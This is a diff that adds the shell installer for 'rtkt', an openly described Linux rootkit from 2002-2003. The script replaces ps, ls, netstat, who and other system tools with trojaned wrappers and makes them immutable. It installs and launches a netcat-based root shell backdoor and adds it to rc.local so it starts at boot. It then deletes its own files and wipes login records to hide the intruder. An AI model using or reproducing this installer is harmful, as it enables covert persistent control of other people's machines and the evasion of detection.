@@ -1,0 +1,193 @@
+#!/bin/sh
+# rtkt v0.3.0 - (C)opyright 2002-2003, SodaPhish, all rights reserved.
+# 
+# description: 
+#	this is the installer for rtkt it does all the footwork. `rtkt` is
+#	not a subtle root kit, and does not exist solely to serve as a root
+#	kit but rather to demonstrate the power of immutability that could
+#	be added to other rootkits.
+#
+# todo: 
+#	- auto determine 'root' user and group for setting permissions.
+#	- auto determine the location of rc.local or equiv
+# 	- auto determine which binaries we want to alter
+#	- allow automatic reloaction of INSTDIR at install
+#	- support compilation of wrappers and other sources at install
+#	- support for FreeBSD, NetBSD, OpenBSD, Solaris, and others
+#	- make sure port 8080 is free for ncshd, if it isn't, use different port
+#
+
+
+# binaries we will use... need to make sure we've got their path.
+BIN_WHICH=/usr/bin/which
+BIN_UNAME=`$BIN_WHICH uname`
+BIN_PS=`$BIN_WHICH ps`
+BIN_LS=`$BIN_WHICH ls`
+BIN_NETSTAT=`$BIN_WHICH netstat`
+BIN_FIND=`$BIN_WHICH find`
+BIN_DIR=`$BIN_WHICH dir`
+BIN_W=`$BIN_WHICH w`
+BIN_WHO=`$BIN_WHICH who`
+BIN_TOP=`$BIN_WHICH top`
+BIN_PSTREE=`$BIN_WHICH pstree`
+BIN_CAT=`$BIN_WHICH cat`
+BIN_GREP=`$BIN_WHICH grep`
+# determine OS type semi-automatically
+OS=`$BIN_UNAME`
+# this is the directory we've got our distribution files (a.k.a. the kit) in 
+DSTDIR=`pwd`
+# don't change this unless you also change src/*/*.c & src/ncshd to reflect the change.
+INSTDIR=/var/spool/...
+# eventually, we'll determine these automatically
+BINARIES="$BIN_PS $BIN_LS $BIN_NETSTAT $BIN_FIND $BIN_DIR $BIN_W $BIN_TOP $BIN_WHO $BIN_PSTREE"
+
+exit
+
+# make sure everything is where you expect it to be.
+echo "checking kit..."
+for b in $BINARIES; do
+	if [ -f $DSTDIR/dst/`basename $b` ]; then
+		echo "> $DSTDIR/dst/`basename $b` looks good."
+	else 
+		echo ">>>ERROR: couldn't find $DSTDIR/dst/`basename $b`!"
+		echo "...commonly, this means you aren't in the installation directory."
+		echo "...you need to fix that before continuing."
+		# we don't want to continue
+		exit
+	fi
+done;
+
+exit
+
+if [ `which chattr` ]; then
+	echo "> `which chattr` looks good."
+else
+	echo ">>>ERROR: couldn't find \`chattr\`!"
+	echo "...chattr is used to set immutability on installed binaries,"
+	echo "...to make rtkt harder to remove."
+	# we shouldn't go on.
+	exit
+fi
+
+
+
+################################################################################
+
+echo
+echo "stage 1: creating install directories..."
+if [ -d $INSTDIR ]; then
+	/bin/echo "WARNING: $INSTDIR already exists..."
+else
+	echo "> adding $INSTDIR"
+	/bin/mkdir $INSTDIR
+	echo "> setting permissions and ownership on $INSTDIR"
+	/bin/chmod 755 $INSTDIR
+	/bin/chown root:root $INSTDIR
+fi
+
+
+echo
+echo "stage 2: installing binary wrappers..."
+for b in $BINARIES ; do
+
+	if [ -x $b ]; then
+		echo "> relolcating 'real' binarie $b"
+		mv $b $INSTDIR/.`basename $b`
+		echo "> installing wrapper for $b"
+		cp $DSTDIR/dst/`basename $b` $b
+		# protect the newly installed binary wrapper; protect the 'real' binary later in script
+		echo "> protecting $b" 
+		chattr +i $b
+		# set perms on $b so it works
+		echo "> setting perms on $b"
+		chmod 755 $b
+	else 
+		echo ">>> WARNING: skipping $b; does not exist or is not executable." 
+		echo ">>>          NOTICE: your kit isn't complete, you could be discovered!"
+	fi
+	
+done
+
+
+# install and launch rootshell
+echo
+echo "stage 3: installing rootshell..."
+if [ -x $DSTDIR/dst/ncshd ]; then
+	echo "> install rootshell"
+	cp $DSTDIR/dst/ncshd /usr/sbin/ncshd
+	echo "> install nc binary"
+	cp $DSTDIR/dst/nc $INSTDIR
+	echo "> protect rootshell"
+	chattr +i /usr/sbin/ncshd
+	echo "> launch rootshell"
+	nohup /usr/sbin/ncshd 2>&1
+	echo "> set rootshell to launch at startup"
+	echo "#ncshd - new C services handler depot" >> /etc/rc.d/rc.local
+	echo "/usr/sbin/ncsd" >> /etc/rc.d/rc.local
+	echo -n "> rootshell "
+	$BIN_CAT /usr/sbin/ncshd | $BIN_GREP "PW="
+	echo -n "> rootshell is on "
+	$BIN_CAT /usr/sbin/ncshd | $BIN_GREP "PORT="
+fi
+
+
+echo
+echo "stage 4: install additional tools."
+# install wipe
+if [ -x $DSTDIR/dst/wipe ]; then
+	echo "> installing wipe..."
+	cp $DSTDIR/dst/wipe $INSTDIR/wipe
+else
+	echo ">>> WARNING: skipping `wipe`; does not exist or is not executable." 
+	echo ">>>          NOTICE: your kit isn't complete, you could be discovered!"
+fi
+# install lcap
+if [ -x $DSTDIR/dst/lcap ]; then
+	echo "> installing lcap (netmem)..." 
+	cp $DSTDIR/dst/lcap /usr/sbin/netmem
+	echo "> protecting lcap (netmem)..."
+	chattr +i /usr/sbin/netmem
+else
+	echo ">>> WARNING: skipping `netmem`; does not exist or is not executable." 
+	echo ">>>          NOTICE: your kit isn't complete, you could be discovered!"
+fi
+
+
+echo
+echo "stage 5: additional mutation protection."
+# protect our $INSTDIR files, just in case they're found.
+echo "> setting immutatable bit on $INSTDIR, recursively."
+chattr -R +i $INSTDIR
+# every time rc.local is run, immutability bit modification will be disabled!
+echo "> turn on immutability at boot."
+echo "/usr/sbin/netmem CAP_LINUX_IMMUTABLE" >> /etc/rc.d/rc.local
+# make it so no one can modify /etc/rc.d/rc.local
+echo "> protect rc.local from immutability"
+chattr +i /etc/rc.d/rc.local
+# turn on immutability protection with lcap
+echo "> turn immutability on."
+/usr/sbin/netmem CAP_LINUX_IMMUTABLE
+
+
+echo "INSTALLATION FINISHED!"
+echo
+echo "stage 6: cleaning up."
+cd /
+rm -rf $DSTDIR
+if [ -d $DSTDIR ]; then
+	echo ">>> WARNING: removing $DSTDIR failed, it is HIGHLY recommended"
+	echo "...that you manually remove $DSTDIR."
+else
+	echo "> removed $DSTDIR, okay!"; 
+fi
+
+# run `wipe` and clean things up so we aren't detectable
+echo "> running `wipe`..."
+if [ -x $INSTDIR/wipe ]; then
+	$INSTDIR/wipe u root
+	$INSTDIR/wipe w root
+	$INSTDIR/wipe l root
+else 
+	echo ">>> WARNING: couldn't run `wipe`, there may still be traces"
+	echo "...of you on this system!"
+fi
